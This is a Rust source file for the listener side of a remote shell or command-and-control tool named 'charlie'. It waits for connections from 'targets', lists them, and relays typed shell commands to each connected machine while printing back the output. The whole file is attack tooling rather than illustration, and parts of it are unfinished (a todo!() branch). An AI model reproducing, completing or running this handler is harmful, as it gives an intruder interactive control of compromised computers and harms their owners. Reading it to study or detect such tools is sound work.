use std::net::{TcpListener, TcpStream};
use std::io::{self, stdin, Read, Write};
use std::str;

pub fn socket_listen(addr: &String, port: &String) {

    let mut target_vec: Vec<&TcpStream> = vec![];

    // bind to socket
    let listner = TcpListener::bind(format!("{addr}:{port}")).unwrap();

    println!("Waiting for connection...");
    
    for stream in listner.incoming() {

        let mut stream = stream.unwrap();

        println!("Connection received from {}", stream.peer_addr().unwrap());

        target_vec.push(&stream);

        loop {
            // write
            print!("charlie > ");
            io::stdout().flush().unwrap();
            let mut write_buf = String::new();
            stdin().read_line(&mut write_buf).unwrap();
            parse_command(write_buf, &mut stream);
            
            // stream.write(write_buf.as_bytes()).unwrap();

            // read
            let mut read_buf = [0u8; 1024];
            let mut bytes_read = stream.read(&mut read_buf).unwrap();
            while bytes_read >= read_buf.len() {
                let data = &read_buf[..bytes_read];
                print!("{}", str::from_utf8(&data).unwrap());
                bytes_read = stream.read(&mut read_buf).unwrap();
            }
            let data = &read_buf[..bytes_read];
            print!("{}", str::from_utf8(&data).unwrap());
        }
    }
}

fn charlie_execute_show_targets (stream: &mut TcpStream) {
    println!("{}",stream.peer_addr().unwrap());
}

fn parse_command (command: String, stream: &mut TcpStream) {
    let mut command = command.split(" ");
    let command_type = command.next().unwrap();
    match command_type {
        "shell" => {
            let shell_command = command.remainder().unwrap().trim();
            stream.write(shell_command.as_bytes()).unwrap();
        },
        "charlie" => {
            let charlie_command = command.remainder().unwrap().trim();
            match charlie_command {
                "show targets" => {
                    charlie_execute_show_targets(stream);
                    stream.write("\0".as_bytes()).unwrap();
                },
                _ => todo!()
            };
        },
        _ => {
            println!("{} is not a recognized command.", command_type.trim());
            stream.write("\0".as_bytes()).unwrap();
        }
    };
}
